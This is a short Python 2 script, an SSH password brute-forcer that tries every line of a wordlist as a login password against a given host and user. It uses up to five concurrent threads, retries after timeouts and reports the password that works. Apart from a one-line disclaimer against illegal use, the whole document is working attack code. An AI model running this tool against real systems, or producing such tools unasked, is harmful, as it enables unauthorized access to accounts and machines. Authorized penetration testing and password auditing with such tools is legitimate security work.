#!./env/bin/python

""" SSH Password Brute Forcer

    Takes optional host, username, and password file arguments to connect to
    a host and test every line in the password file as a potential password until
    a login occurs.

    Don't be a moron, please don't use this for something illegal.

    Usage:
        ssh_brute_forcer.py <host> <user> <password_file>
        ssh_brute_forcer.py -h | --help
        ssh_brute_forcer.py --version

    Options:
        -h --help       Show this screen.
        --version       Show version

    Examples:
        ./ssh_brute_forcer.py localhost root wordlist/general/common.txt
"""

import pxssh
import time
from docopt import docopt
from threading import Thread, BoundedSemaphore
from colorama import Fore, init


maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print s.before


def connect(host, user, password, release):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print Fore.GREEN + '[+] Password Found: ' + password + Fore.RESET
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main(arguments):
    fn = open(arguments['<password_file>'], 'r')
    for line in fn.readlines():
        if Found:
            print Fore.GREEN + "[*] Exiting: Password Found" + Fore.RESET
            exit(0)
        if Fails > 5:
            print Fore.RED + "[!] Exiting: Too Many Socket Timeouts" + Fore.RESET
            exit(0)

        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print "[-] Testing: " + str(password)

        t = Thread(target=connect, args=(arguments['<host>'], arguments['<user>'], password, True))
        t.start()

if __name__ == '__main__':
    init()
    arguments = docopt(__doc__, version="0.1")
    main(arguments)
